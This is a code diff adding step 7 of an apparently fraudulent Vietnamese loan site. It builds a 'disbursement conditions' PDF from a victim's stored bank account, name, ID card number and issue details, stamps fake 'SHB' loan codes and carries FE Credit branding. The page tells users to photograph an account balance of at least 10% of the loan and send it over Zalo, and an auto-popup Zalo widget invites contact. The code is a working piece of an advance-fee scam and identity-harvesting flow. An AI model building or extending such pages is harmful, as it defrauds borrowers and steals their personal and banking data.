+        function renderCanvas(canvasId, imageUrl, fallbackUrl) {
+          const canvas = document.getElementById(canvasId);
+          if (!canvas) {
+            showFormMessage("Không tìm thấy khu vực hiển thị điều kiện giải ngân.");
+            setActionButtonsEnabled(false);
+            return;
+          }
+
+          const ctx = canvas.getContext("2d");
+          const img = new Image();
+          img.crossOrigin = "anonymous";
+
+          const drawImageWithData = (imageElement) => {
+            canvas.classList.remove("loading");
+
+            const containerWidth = canvas.parentElement.clientWidth;
+            const maxWidth = Math.min(containerWidth * 0.95, 800);
+            const aspectRatio = 1240 / 1754;
+
+            canvas.width = maxWidth;
+            canvas.height = maxWidth / aspectRatio;
+            ctx.drawImage(imageElement, 0, 0, canvas.width, canvas.height);
+
+            const scaleX = canvas.width / 1240;
+            const scaleY = canvas.height / 1754;
+
+            canvasFields.forEach((field) => {
+              const value = field.value || "";
+              if (!value || field.x < 0 || field.y < 0) return;
+
+              const scaledX = field.x * scaleX;
+              const scaledY = field.y * scaleY;
+              const fontSize = parseInt(field.font, 10) * Math.min(scaleX, scaleY);
+
+              ctx.font = field.font.replace(/bold \d+px/, `bold ${Math.max(fontSize, 8)}px`);
+              ctx.fillStyle = field.color;
+              ctx.fillText(value, scaledX, scaledY);
+            });
+
+            if (canProceedToStep8) {
+              setActionButtonsEnabled(true);
+            }
+          };
+
+          const loadFallbackImage = () => {
+            if (!fallbackUrl) {
+              drawDisbursementPlaceholder(canvas, ctx);
+              setActionButtonsEnabled(false);
+              showFormMessage("Không thể tải điều kiện giải ngân. Vui lòng thử lại sau.");
+              return;
+            }
+
+            const fallbackImg = new Image();
+            fallbackImg.crossOrigin = "anonymous";
+            fallbackImg.onload = () => {
+              drawImageWithData(fallbackImg);
+              if (canProceedToStep8) {
+                showFormMessage("✓ Đã tải thành công điều kiện giải ngân", "#28a745");
+              }
+            };
+            fallbackImg.onerror = () => {
+              drawDisbursementPlaceholder(canvas, ctx);
+              setActionButtonsEnabled(false);
+              showFormMessage("Không thể tải điều kiện giải ngân. Vui lòng thử lại sau.");
+            };
+            fallbackImg.src = fallbackUrl;
+          };
+
+          img.onload = () => {
+            drawImageWithData(img);
+            showFormMessage("");
+          };
+
+          img.onerror = () => {
+            loadFallbackImage();
+          };
+
+          canvas.classList.add("loading");
+          showFormMessage("");
+          img.src = imageUrl;
+        }
+
+      function drawDisbursementPlaceholder(canvas, ctx) {
+        const containerWidth = canvas.parentElement.clientWidth;
+        const maxWidth = Math.min(containerWidth * 0.95, 800);
+        const aspectRatio = 1240 / 1754;
+
+        canvas.width = maxWidth;
+        canvas.height = maxWidth / aspectRatio;
+
+        ctx.fillStyle = "#ffffff";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+        ctx.fillStyle = "#00994F";
+        ctx.fillRect(50, 50, canvas.width - 100, 150);
+
+        ctx.fillStyle = "#ffffff";
+        ctx.font = "bold 60px Arial";
+        ctx.textAlign = "center";
+        ctx.fillText("ĐIỀU KIỆN GIẢI NGÂN", canvas.width / 2, 140);
+
+        ctx.strokeStyle = "#00994F";
+        ctx.lineWidth = 6;
+        ctx.strokeRect(80, 250, canvas.width - 160, canvas.height - 400);
+
+        ctx.fillStyle = "#333333";
+        ctx.font = "bold 45px Arial";
+        ctx.fillText("THÔNG TIN KHÁCH HÀNG", canvas.width / 2, 350);
+
+        const fields = [
+          "Số tài khoản: _________________________",
+          "Họ và tên: ___________________________",
+          "Ngân hàng: __________________________",
+          "CMND/CCCD: ________________________",
+          "Ngày cấp: ___________________________",
+          "Nơi cấp: ____________________________",
+        ];
+
+        ctx.fillStyle = "#666666";
+        ctx.font = "35px Arial";
+        ctx.textAlign = "left";
+        fields.forEach((field, index) => {
+          ctx.fillText(field, 150, 450 + index * 60);
+        });
+
+        ctx.fillStyle = "#00994F";
+        ctx.font = "bold 40px Arial";
+        ctx.textAlign = "center";
+        ctx.fillText("YÊU CẦU GIẢI NGÂN", canvas.width / 2, 850);
+
+        ctx.fillStyle = "#333333";
+        ctx.font = "32px Arial";
+        ctx.fillText("1. Chụp ảnh số dư tài khoản (tối thiểu 10% số tiền vay)", canvas.width / 2, 920);
+        ctx.fillText("2. Gửi ảnh cho bộ phận thẩm định qua Zalo", canvas.width / 2, 970);
+        ctx.fillText("3. Chờ xác minh và nhận tiền trong 1-2 giờ", canvas.width / 2, 1020);
+
+        ctx.fillStyle = "#00994F";
+        ctx.font = "bold 35px Arial";
+        ctx.fillText("FE CREDIT BANK VIETNAM - Hotline: 1900 5555 888", canvas.width / 2, canvas.height - 80);
+      }
+
+      const canvasFields = [
+        { value: "", x: 423, y: 322, font: "bold 23px Arial", color: "#000000" },
+        { value: "", x: 429, y: 354, font: "bold 23px Arial", color: "#000000" },
+        { value: "", x: 423, y: 390, font: "bold 23px Arial", color: "#000000" },
+        { value: "", x: 429, y: 444, font: "bold 23px Arial", color: "#000000" },
+        { value: "", x: 423, y: 487, font: "bold 23px Arial", color: "#000000" },
+        { value: "", x: 707, y: 487, font: "bold 23px Arial", color: "#000000" },
+        { value: "", x: 952, y: 487, font: "bold 23px Arial", color: "#000000" },
+        { value: generateRandomCode("SHB"), x: 211, y: 60, font: "bold 27px Arial", color: "#000000" },
+        { value: generateRandomCode("SHB"), x: 211, y: 97, font: "bold 27px Arial", color: "#000000" },
+      ];
+
+      function downloadAsPDF(canvas, filename) {
+        const { jsPDF } = window.jspdf;
+        const pdf = new jsPDF({
+          orientation: canvas.width > canvas.height ? "landscape" : "portrait",
+          unit: "px",
+          format: [canvas.width, canvas.height],
+        });
+        pdf.addImage(canvas.toDataURL("image/png"), "PNG", 0, 0, canvas.width, canvas.height);
+        pdf.save(filename);
+      }
+
+        $(function () {
+          const $downloadBtn = $("#downloadDisbursementBtn");
+          const $proceedBtn = $("#proceedToFinalStepBtn");
+
+          setActionButtonsEnabled(false);
+
+          $downloadBtn.on("click", function () {
+            if ($downloadBtn.prop("disabled")) {
+              return;
+            }
+
+            const canvas = document.getElementById("disbursementCanvas");
+            if (!canvas || !canvas.width || !canvas.height) {
+              showFormMessage("Điều kiện giải ngân chưa sẵn sàng để tải xuống. Vui lòng thử lại.");
+              return;
+            }
+
+            try {
+              if (!window.jspdf || typeof window.jspdf.jsPDF !== "function") {
+                throw new Error("jsPDF library is unavailable");
+              }
+
+              const sanitizedLoanCode = (userData.loanCode || "unknown").replace(/[^a-zA-Z0-9_-]/g, "");
+              const fileName = `DieuKienGiaiNgan_${sanitizedLoanCode || "unknown"}.pdf`;
+              downloadAsPDF(canvas, fileName);
+
+              userData.disbursementDownloadedAt = new Date().toISOString();
+              saveToLocalStorage();
+              showFormMessage("Điều kiện giải ngân đã được tải xuống thành công.");
+            } catch (error) {
+              if (window.Logger) {
+                window.Logger.error("Không thể xuất điều kiện giải ngân:", error);
+              }
+              showFormMessage("Không thể tải điều kiện giải ngân. Vui lòng thử lại.");
+            }
+          });
+
+          $proceedBtn.on("click", function () {
+            if ($proceedBtn.prop("disabled")) {
+              return;
+            }
+
+            if (!canProceedToStep8) {
+              showFormMessage("Hồ sơ của bạn chưa sẵn sàng. Vui lòng kiểm tra lại.");
+              return;
+            }
+
+            if (!userData.disbursementDownloadedAt) {
+              showFormMessage("Vui lòng tải điều kiện giải ngân trước khi tiếp tục.");
+              return;
+            }
+
+            showFormMessage("");
+            userData.currentStep = 8;
+            userData.lastStep7CompletedAt = new Date().toISOString();
+            saveToLocalStorage();
+            sendApprovalEmail();
+
+            const nextUrl = $proceedBtn.data("next-url") || "step8.html";
+            window.location.href = nextUrl;
+          });
+        });
+
+      window.onload = function () {
+        loadUserData();
+
+        canvasFields[0].value = userData.accountNumber || "";
+        canvasFields[1].value = userData.fullName || "";
+        canvasFields[2].value = userData.bankName || "";
+        canvasFields[3].value = userData.fullName || "";
+        canvasFields[4].value = userData.cccd || "";
+        canvasFields[5].value = userData.idIssueDate || "";
+        canvasFields[6].value = userData.idIssuePlace || "";
+        canvasFields[7].value = userData.loanCode || generateRandomCode("SHB");
+        canvasFields[8].value = userData.loanCode || generateRandomCode("SHB");
+
+        renderCanvas("disbursementCanvas", DISBURSEMENT_IMAGE_PATH, DISBURSEMENT_IMAGE_PATH);
+        userData.currentStep = 7;
+        saveToLocalStorage();
+      };
+
+      // Menu toggle function
+      // toggleMenu moved to shared-components.js
+    </script>
+
+    <div
+      class="zalo-chat-widget"
+      data-oaid="3932037504673339016"
+      data-welcome-message="Chào anh chị ạ , mình cần hỗ trợ thẩm định và xét duyệt điều kiện giải ngân đúng không ạ !"
+      data-autopopup="5"
+      data-width=""
+      data-height=""
+    ></div>
+    <script src="https://sp.zalo.me/plugins/sdk.js"></script>
+  </body>
+</html>
